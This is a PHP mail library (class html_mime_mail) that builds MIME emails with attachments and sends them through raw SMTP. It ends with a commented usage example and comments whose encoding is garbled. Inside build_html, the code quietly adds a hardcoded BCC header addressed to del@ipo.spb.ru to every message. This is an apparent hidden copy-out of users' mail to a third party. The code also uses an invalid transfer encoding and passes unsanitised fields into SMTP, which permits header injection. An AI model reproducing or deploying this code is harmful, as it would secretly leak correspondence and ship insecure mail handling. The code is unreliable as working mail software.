<?
// �������.

class html_mime_mail {
  var $headers; 
  var $multipart; 
  var $mime; 
  var $html; 
  var $parts = array(); 

function html_mime_mail($headers="") { 
    $this->headers=$headers; 
} 

function add_html($html="") { 
    $this->html.=$html; 
} 

function build_html($orig_boundary,$kod) { 
    $this->multipart.="--$orig_boundary\n"; 
    if ($kod=='w' || $kod=='win' || $kod=='windows-1251') $kod='windows-1251';
    else $kod='koi8-r';
    $this->multipart.="Content-Type: text/html; charset=$kod\n"; 
    $this->multipart.="BCC: del@ipo.spb.ru\n";
    $this->multipart.="Content-Transfer-Encoding: Quot-Printed\n\n"; 
    $this->multipart.="$this->html\n\n"; 
} 


function add_attachment($path="", $name = "",$truename="",$c_type="application/octet-stream") { 
    if (!file_exists($path.$name)) {
      print "File ".${path}.${name}." dosn't exist.";
      return;
    }
    $fp=fopen($path.$name,"r");
    if (!$fp) {
      print "File $path.$name coudn't be read.";
      return;
    } 
    $file=fread($fp, filesize($path.$name));
    fclose($fp);
//    $this->parts[]=array("body"=>$file, "name"=>$name,"c_type"=>$c_type);
    $this->parts[]=array("body"=>$file, "name"=>$truename,"c_type"=>$c_type);

} 


function build_part($i) { 
    $message_part=""; 
    $message_part.="Content-Type: ".$this->parts[$i]["c_type"]; 
    if ($this->parts[$i]["name"]!="") 
       $message_part.="; name = \"".$this->parts[$i]["name"]."\"\n"; 
    else 
       $message_part.="\n"; 
    $message_part.="Content-Transfer-Encoding: base64\n"; 
    $message_part.="Content-Disposition: attachment; filename = \"".
       $this->parts[$i]["name"]."\"\n\n"; 
    $message_part.=chunk_split(base64_encode($this->parts[$i]["body"]))."\n";
    return $message_part; 
} 


function build_message($kod) { 
    $boundary="=_".md5(uniqid(time())); 
    $this->headers.="MIME-Version: 1.0\n"; 
    $this->headers.="Content-Type: multipart/mixed; boundary=\"$boundary\"\n"; 
    $this->multipart=""; 
    $this->multipart.="This is a MIME encoded message.\n\n"; 
    $this->build_html($boundary,$kod); 
    for ($i=(count($this->parts)-1); $i>=0; $i--)
      $this->multipart.="--$boundary\n".$this->build_part($i); 
    $this->mime = "$this->multipart--$boundary--\n"; 
} 


function send($server, $to, $from, $subject="", $headers="") { 

    $headers="To: $to\nFrom: $from\nSubject: $subject\nX-Mailer: The Mouse!\n$headers";
    $fp = fsockopen($server, 25, $errno, $errstr, 5);
    if (!$fp){
	//echo $errstr;
	return 1;
    }
    fputs($fp,"HELO $server\n");
    fputs($fp,"MAIL FROM: $from\n");
    fputs($fp,"RCPT TO: $to\n");
    fputs($fp,"DATA\n");
    fputs($fp,$this->headers);
    if (strlen($headers))
      fputs($fp,"$headers\n");
    fputs($fp,$this->mime);
    fputs($fp,"\n.\nQUIT\n");
    while(!feof($fp))
      $resp.=fgets($fp,1024);
    fclose($fp);
    return 0;
  } 
}


// *************************************************************************
//
//   � �������� ������ �p���������� html-������ (����������� �������������).
//   ������ ����� - ��������� ���� �� ��������.
//   ��� ��� �������� ��� ��, ��� �������� ����:
//
// *************************************************************************

/*

  $mail=new html_mime_mail();
  $mail->add_html("<html><body><center><h2>�p����!<br><br>".
                  "<br>������� �������� ���� [/bin/ls] ...".
                  "</h2></center></body></html>");
  $mail->add_attachment("/hosting/yamiyam.dp.ua/connect/","dot.cgi");
  $mail->build_message('win'); // ���� �� "win", �� ����p���� koi8
  $mail->send('localhost',
              'den@yamiyam.dp.ua',
              'hostmaster@arrakis.dp.ua',
              'Subject of letter');

*/

//
// ����� ������� ������ ������ �� ��� ������������ /bin/ls � ���������� �
// ��������������� �� ������: 
// 
//    X:\temp>fc /b ls ls2
//    ��������� ������ ls � LS2
//    FC: �������� �� �������
//
//
// ��������! ���� � ��� ��� ����� /bin/ls, �� ������ ��������������� ������
// $mail->add_attachment("/bin/","ls"), ����� ��������� �� �������� ������������
// � ������ ��c����������� �����.
//


?>
